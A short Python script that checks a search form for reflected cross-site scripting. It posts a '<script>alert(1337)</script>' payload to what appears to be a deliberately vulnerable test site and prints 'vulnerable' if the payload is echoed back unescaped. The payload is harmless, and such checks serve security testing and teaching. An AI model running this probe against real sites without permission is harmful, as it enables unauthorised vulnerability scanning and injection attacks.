import requests

payload = "<script>alert(1337)</script>"

r = requests.post("http://testphp.vulnweb.com/search.php?test=query",
                  data={"searchFor": payload})

print(r.text)

if payload.lower() in r.text.lower():
  print("vulnerable")
